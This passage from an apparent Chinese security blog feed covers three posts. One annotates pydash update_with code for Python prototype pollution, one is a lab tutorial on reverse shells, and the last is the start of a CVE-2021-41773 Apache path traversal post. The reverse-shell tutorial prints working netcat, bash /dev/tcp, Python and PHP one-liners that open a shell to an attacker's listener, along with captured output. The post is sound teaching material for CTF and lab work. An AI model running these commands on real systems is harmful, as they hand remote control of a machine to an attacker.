integer.</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">#由于我们无法判断一个空数应该是字典键还是列表索引，我们</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#支持一种特殊语法，其中任何被括号括起来的字符串整数都被视为</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#列表索引并转换为整数。</span></span><br><span class=\"line\">        keys = [ <span class=\"comment\">#使用正则表达式 RE_PATH_KEY_DELIM来分割字符串。分割后，对于每个部分（key），会进一步检查：</span></span><br><span class=\"line\">            PathToken(<span class=\"built_in\">int</span>(key[<span class=\"number\">1</span>:-<span class=\"number\">1</span>]), default_factory=<span class=\"built_in\">list</span>)</span><br><span class=\"line\">            <span class=\"comment\">#如果 key 匹配 RE_PATH_LIST_INDEX，则将该部分视为列表索引，并创建一个 PathToken 对象，其键为转换后的整数索引，默认值生成器为 list。</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> RE_PATH_LIST_INDEX.<span class=\"keyword\">match</span>(key)</span><br><span class=\"line\">            <span class=\"keyword\">else</span> PathToken(unescape_path_key(key), default_factory=<span class=\"built_in\">dict</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> <span class=\"built_in\">filter</span>(<span class=\"literal\">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class=\"line\">        ]</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"comment\">#如果 key 不匹配 RE_PATH_LIST_INDEX，则将其视为字典键，并通过 unescape_path_key（未在代码段中定义，但我们可以假设它用于处理可能的转义字符）函数处理后，创建一个 PathToken 对象，其键为处理后的字符串，默认值生成器为 dict。</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> pyd.is_string(value) <span class=\"keyword\">or</span> pyd.is_number(value):</span><br><span class=\"line\">        keys = [PathToken(value, default_factory=<span class=\"built_in\">dict</span>)]</span><br><span class=\"line\">    <span class=\"comment\">#如果 value 是 UNSET则返回一个空的 PathToken 列表。</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> value <span class=\"keyword\">is</span> UNSET:</span><br><span class=\"line\">        keys = []</span><br><span class=\"line\">    <span class=\"comment\">#如果 value 不是上述任何一种情况（即它可能已经是一个列表或类似结构），则直接返回 value（尽管这里可能存在一个类型不匹配的问题，因为通常我们期望返回的是 PathToken 对象的列表，而不是原始值）。然而，基于函数的命名和描述，这可能是一个错误或特殊情况的处理方式。</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        keys = value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> keys</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里比较重要，分析一下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#遍历path并更新对象</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> idx, token <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(pyd.initial(tokens)):<span class=\"comment\">#这行代码使用enumerate函数遍历tokens列表，但通过pyd.initial函数来获取除了最后一个元素之外的所有元素。这意味着遍历将跳过tokens列表的最后一个元素。</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#这里检查当前遍历到的token是否是PathToken类的实例。如果是，则从token中提取key值，并尝试从tokens中获取下一个元素的default_factory。如果不存在，则使用default_type作为默认值。</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(token, PathToken):</span><br><span class=\"line\">        key = token.key</span><br><span class=\"line\">        default_factory = pyd.get(tokens, [idx + <span class=\"number\">1</span>, <span class=\"string\">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"comment\">#如果token不是PathToken类的实例，则直接将token作为key，并将default_factory设置为default_type。</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        key = token</span><br><span class=\"line\">        default_factory = default_type</span><br><span class=\"line\"></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"comment\">#使用base_get函数尝试从target对象中获取key对应的值，如果没有找到则默认为None。同时，将path_obj初始化为None。</span></span><br><span class=\"line\">    obj_val = base_get(target, key, default=<span class=\"literal\">None</span>)</span><br><span class=\"line\">    path_obj = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#如果call_customizer为真（假设是一个函数），则调用该函数，并传入当前值obj_val、键key和目标对象target，结果赋值给path_obj。</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> call_customizer:</span><br><span class=\"line\">        path_obj = call_customizer(obj_val, key, target)</span><br><span class=\"line\">        </span><br><span class=\"line\">\t<span class=\"comment\">#如果path_obj仍然是None，则调用default_factory来创建一个新的对象，并将其赋值给path_obj。</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> path_obj <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        path_obj = default_factory()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#使用base_set函数将path_obj设置到target对象的key位置上，且不允许覆盖</span></span><br><span class=\"line\">    base_set(target, key, path_obj, allow_override=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#尝试重新获取target对象中key对应的值，如果失败，会捕获TypeError。在捕获异常的处理中，尝试将key作为索引来直接从target中获取元素。如果这也失败，则标记为失败（_failed = True）并抛出一个包含原始异常信息的TypeError。</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        target = base_get(target, key, default=<span class=\"literal\">None</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> TypeError <span class=\"keyword\">as</span> exc:  <span class=\"comment\"># pragma: no cover</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            target = target[<span class=\"built_in\">int</span>(key)]</span><br><span class=\"line\">            _failed = <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            _failed = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> _failed:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> TypeError(<span class=\"string\">f&quot;Unable to update object at index <span class=\"subst\">&#123;key!r&#125;</span>. <span class=\"subst\">&#123;exc&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个  <code>update_with</code>  函数的作用可以总结如下：</p>\n<ol>\n<li><strong>更新嵌套对象</strong>：函数用于在给定的  <code>obj</code> （一个列表或字典）中按照  <code>path</code>  指定的路径更新一个值。</li>\n<li><strong>路径处理</strong>： <code>path</code>  可以是一个字符串或键的列表，描述了要修改的对象路径。</li>\n<li><strong>自定义更新</strong>： <code>updater</code>  是一个可调用对象，它用于生成更新后的值。如果  <code>updater</code>  不是一个可调用对象，它会被转换为一个返回常量值的函数。</li>\n<li><strong>自定义值生成</strong>： <code>customizer</code>  是一个可选的可调用对象，它用于自定义路径上的对象值。如果  <code>customizer</code>  返回  <code>None</code> ，则路径上的对象值由函数本身处理。</li>\n<li><strong>自定义参数</strong>： <code>customizer</code>  被调用时接收三个参数： <code>(nested_value, key, nested_object)</code> 。</li>\n<li><strong>递归创建路径</strong>：函数递归地遍历  <code>path</code> ，创建路径上的对象，如果路径上的对象不存在，则使用  <code>default_factory</code>  创建。</li>\n<li><strong>更新最终值</strong>：遍历完成后，使用  <code>updater</code>  更新路径最终位置上的值。</li>\n<li><strong>错误处理</strong>：如果在获取或设置路径上的值时遇到  <code>TypeError</code> ，函数会尝试使用整数索引访问，如果仍然失败，则抛出异常。</li>\n<li><strong>原地修改</strong>： <code>obj</code>  是直接在原对象上进行修改的，而不是返回一个新的对象。</li>\n<li><strong>返回值</strong>：函数返回修改后的  <code>obj</code> 。</li>\n</ol>\n<p>​\t\t简而言之， <code>update_with</code>  函数根据提供的路径，使用自定义逻辑递归地创建或更新一个嵌套的列表或字典中的值，并在路径的最终位置应用一个更新函数。</p>\n<h1 id=\"参考文章\"><a class=\"markdownIt-Anchor\" href=\"#参考文章\">#</a> 参考文章：</h1>\n<h2 id=\"基础资料\"><a class=\"markdownIt-Anchor\" href=\"#基础资料\">#</a> 基础资料</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXp1cmlzLmNuLzIwMjMvMDcvMjcvUHl0aG9uJUU1JThFJTlGJUU1JTlFJThCJUU5JTkzJUJFJUU2JUIxJUExJUU2JTlGJTkzLw==\">Python 原型链污染</span></p>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTg3Ni8jdG9jX180\">Python 原型链污染变体 (prototype-pollution-in-python)</span></strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mdXJpbmEub3JnLmNuLzIwMjMvMTIvMTgvcHJvdG90eXBlLXBvbGx1dGlvbi1pbi1weWRhc2gtY3RmLyMlRTQlQkIlQTMlRTclQTAlODElRTglQjAlODMlRTglQUYlOTU=\">Pydash 原型链污染</span></p>\n<h2 id=\"做题参考\"><a class=\"markdownIt-Anchor\" href=\"#做题参考\">#</a> 做题参考：</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTQ2MjA/dGltZV9fMTMxMT1HcUFoWUswS0JLOEQlMkZEMGx0ZEdRNTVNRFJvdEl0ZUQ=\">从 CISCN2024 的 sanic 引发对 python “原型链” 的污染挖掘</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3huZ3huZ3huL3AvMTgyMDUyMzU=\">CISCN2024-WEB-Sanic gxngxngxn    </span></p>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/2f610211.html",
            "url": "http://blog.g01den.top/posts/2f610211.html",
            "title": "反弹shell",
            "date_published": "2024-06-18T11:57:36.000Z",
            "content_html": "<h1 id=\"反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell\">#</a> 反弹 shell：</h1>\n<h2 id=\"简介\"><a class=\"markdownIt-Anchor\" href=\"#简介\">#</a> 简介；</h2>\n<p>​\t\t反弹 shell，就是攻击机监听在某个 TCP/UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>\n<h2 id=\"正向连接\"><a class=\"markdownIt-Anchor\" href=\"#正向连接\">#</a> 正向连接：</h2>\n<p>​\t\t假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。</p>\n<h2 id=\"反向连接\"><a class=\"markdownIt-Anchor\" href=\"#反向连接\">#</a> 反向连接：</h2>\n<p>​\t\t反弹 shell 通常适用于如下几种情况：</p>\n<ul>\n<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>\n<li>目标机端口被占用。</li>\n<li>目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。</li>\n<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li>\n</ul>\n<p>​\t\t对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p>\n<p>​\t\t反向连接就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。</p>\n<h2 id=\"利用netcat反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用netcat反弹shell\">#</a> 利用 netcat 反弹 shell：</h2>\n<p>​\t\t目前，默认的各个 linux 发行版本已经自带了 netcat 工具包，但是可能由于处于安全考虑原生版本的 netcat 带有可以直接发布与反弹本地 shell 的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class=\"line\">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\">make clean</span><br></pre></td></tr></table></figure>\n<p>​\t\t安装完原生版本的 netcat 工具后，便有了 netcat -e 参数，我们就可以将本地 bash 反弹到攻击机上了。</p>\n<h3 id=\"攻击机开启本地监听\"><a class=\"markdownIt-Anchor\" href=\"#攻击机开启本地监听\">#</a> <strong>攻击机开启本地监听：</strong></h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netcat -lvvp 2333</span><br></pre></td></tr></table></figure>\n<h3 id=\"目标机主动连接攻击机\"><a class=\"markdownIt-Anchor\" href=\"#目标机主动连接攻击机\">#</a> <strong>目标机主动连接攻击机：</strong></h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netcat &lt;攻击机的IP&gt; 2333 -e /bin/bash</span><br></pre></td></tr></table></figure>\n<h3 id=\"结果\"><a class=\"markdownIt-Anchor\" href=\"#结果\">#</a> 结果：</h3>\n<p>​\t\t首先，我在目标机的根目录存放了一个 flag 文件，之后我尝试在攻击机上读取这个文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─<span class=\"comment\"># cat /flag</span></span><br><span class=\"line\">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后，我们尝试在攻击机上读取 flag 文件：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class=\"line\">└─# netcat -lvvp 2333</span><br><span class=\"line\">listening on [any] 2333 ...</span><br><span class=\"line\">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class=\"line\">connect to [192.168.209.137] from bogon [192.168.209.130] 39610</span><br><span class=\"line\">cat /flag</span><br><span class=\"line\">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br><span class=\"line\">qwe</span><br><span class=\"line\">ca][</span><br></pre></td></tr></table></figure>\n<p>​\t\t首先在攻击机上监听了一下 2333 端口，然后用目标机建立连接，这个时候，我们发现成功读取了 flag 文件，后面我还尝试了几个错误的命令，在目标机器上输出了错误信息。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─# netcat 192.168.209.137  2333 -e /bin/bash</span><br><span class=\"line\">bash: line 2: qwe: command not found</span><br><span class=\"line\">bash: line 3: ca][: command not found</span><br></pre></td></tr></table></figure>\n<h2 id=\"利用bash反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用bash反弹shell\">#</a> 利用 Bash 反弹 shell</h2>\n<p>​\t\t直接放代码：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/&lt;攻击机IP&gt;/2333 0&gt;&amp;1</span><br><span class=\"line\">或</span><br><span class=\"line\">bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;攻击机IP&gt;/2333 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>bash -i</strong>   打开一个交互的 bash</li>\n<li><strong>&gt;&amp;</strong>  将标准错误输出重定向到标准输出</li>\n<li><strong>/dev/tcp/x.x.x.x/port</strong>  意为调用 socket, 建立 socket 连接，其中 x.x.x.x 为要反弹到的主机 ip，port 为端口</li>\n<li><strong>0&gt;&amp;1</strong>   标准输入重定向到标准输出，实现你与反弹出来的 shell 的交互</li>\n</ul>\n<h3 id=\"攻击机开启本地监听-2\"><a class=\"markdownIt-Anchor\" href=\"#攻击机开启本地监听-2\">#</a> <strong>攻击机开启本地监听：</strong></h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2333</span><br></pre></td></tr></table></figure>\n<h3 id=\"目标机主动连接攻击机-2\"><a class=\"markdownIt-Anchor\" href=\"#目标机主动连接攻击机-2\">#</a> <strong>目标机主动连接攻击机：</strong></h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/&lt;攻击机IP&gt;/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<h3 id=\"结果-2\"><a class=\"markdownIt-Anchor\" href=\"#结果-2\">#</a> 结果：</h3>\n<p>​\t攻击机上，我们尝试读取了下文件：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class=\"line\">└─# nc -lvvp 2333</span><br><span class=\"line\">listening on [any] 2333 ...</span><br><span class=\"line\">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class=\"line\">connect to [192.168.209.137] from bogon [192.168.209.130] 54426</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─# cat /flag                                                                                                                                                                                                </span><br><span class=\"line\">cat /flag</span><br><span class=\"line\">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─# qwe                                                                                                                                                                                                      </span><br><span class=\"line\">qwe</span><br><span class=\"line\">bash: qwe: command not found</span><br></pre></td></tr></table></figure>\n<p>​\t\t不过这两个系统都是 kali，倒不是很容易看出来区别是啥？不过，还是把 flag 给都出来了，对了，第一个交互和第二个交互所在的文件夹不同了，这里应该能区分吧。</p>\n<p>​\t\t接下来看看目标机：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─# bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.209.137/2333 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现，没有任何输出，连胡乱输入的命令的报错都没有，说明真的重定向了。</p>\n<h2 id=\"python-脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#python-脚本反弹shell\">#</a> Python 脚本反弹 shell：</h2>\n<p>​\t\t当目标主机上有 python 环境时，我们可以用 Python 来反弹 shell。Python 在现在一般发行版 Linux 系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>\n<h3 id=\"攻击机开启本地监听-3\"><a class=\"markdownIt-Anchor\" href=\"#攻击机开启本地监听-3\">#</a> <strong>攻击机开启本地监听：</strong></h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2333</span><br></pre></td></tr></table></figure>\n<h3 id=\"目标机主动连接攻击机-3\"><a class=\"markdownIt-Anchor\" href=\"#目标机主动连接攻击机-3\">#</a> <strong>目标机主动连接攻击机：</strong></h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;目标机IP&gt;&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"结果-3\"><a class=\"markdownIt-Anchor\" href=\"#结果-3\">#</a> 结果：</h3>\n<p>​\t\t先看看攻击机的情况吧，这里很明显能看出来被攻击了，还是 /bin/sh 这个 shell：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class=\"line\">└─# nc -lvvp 2333</span><br><span class=\"line\">listening on [any] 2333 ...</span><br><span class=\"line\">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class=\"line\">connect to [192.168.209.137] from bogon [192.168.209.130] 46622</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">ls</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">cat</span> /flag</span>           </span><br><span class=\"line\">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t目标机器也是，啥输出都没有：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─# python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.209.137&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"php-脚本反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#php-脚本反弹shell\">#</a> php 脚本反弹 shell：</h2>\n<p>​\t\t当然，CTF 中最经典的 PHP 不能忘了，老样子，</p>\n<h3 id=\"攻击机监听端口\"><a class=\"markdownIt-Anchor\" href=\"#攻击机监听端口\">#</a> 攻击机监听端口：</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2333</span><br></pre></td></tr></table></figure>\n<h3 id=\"目标机器运行php脚本\"><a class=\"markdownIt-Anchor\" href=\"#目标机器运行php脚本\">#</a> 目标机器运行 php 脚本：</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;&lt;攻击机IP地址&gt;&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"结果-4\"><a class=\"markdownIt-Anchor\" href=\"#结果-4\">#</a> 结果：</h3>\n<p>​\t\t攻击机成功读取到了 flag：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class=\"line\">└─# nc -lvvp 2333</span><br><span class=\"line\">listening on [any] 2333 ...</span><br><span class=\"line\">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class=\"line\">connect to [192.168.209.137] from bogon [192.168.209.130] 36986</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">cat</span> /flag</span></span><br><span class=\"line\">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t目标机器也没有任何输出：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─# php -r &#x27;$sock=fsockopen(&quot;192.168.209.137&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a class=\"markdownIt-Anchor\" href=\"#参考\">#</a> 参考：</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTQ4OA==\">反弹 shell，这一篇就够了</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9icnVjZXRnLmdpdGh1Yi5pby8yMDE4LzA1LzAzLyVFNSVBNCU5QSVFNyVBNyU4RCVFNSVBNyVCRiVFNSU4QSVCRiVFNSU4RiU4RCVFNSVCQyVCOXNoZWxsLw==\">多种姿势反弹 shell    </span></p>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/2bb7953f.html",
            "url": "http://blog.g01den.top/posts/2bb7953f.html",
            "title": "部分CVE复现Web（1）",
            "date_published": "2024-06-17T14:14:26.000Z",
            "content_html": "<h1 id=\"apache-http-server-路径穿越漏洞cve-2021-41773\"><a class=\"markdownIt-Anchor\" href=\"#apache-http-server-路径穿越漏洞cve-2021-41773\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU5OTc1NDM5L2FydGljbGUvZGV0YWlscy8xMjUyMjU5NDk/b3BzX3JlcXVlc3RfbWlzYz0lN0IlMjJyZXF1ZXN0JTVGaWQlMjIlM0ElMjIxNzE4NjIwMzk1MTY4MDAyMjc0ODI2MjklMjIlMkMlMjJzY20lMjIlM0ElMjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyMiU3RCZhbXA7cmVxdWVzdF9pZD0xNzE4NjIwMzk1MTY4MDAyMjc0ODI2MjkmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH50b3BfY2xpY2t+ZGVmYXVsdC0xLTEyNTIyNTk0OS1udWxsLW51bGwuMTQyJTVFdjEwMCU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTUmYW1wO3V0bV90ZXJtPUNWRS0yMDIxLTQxNzczJmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==\">Apache HTTP Server 路径穿越漏洞 CVE-2021-41773</span></h1>\n<p>​\t首先，先来看一下这个漏洞的官方描述：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/6a0535188c6e42b49e1bd35d195570e4.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\tCVE-2021-41773 是在 Apache HTTP Server 2.4.49 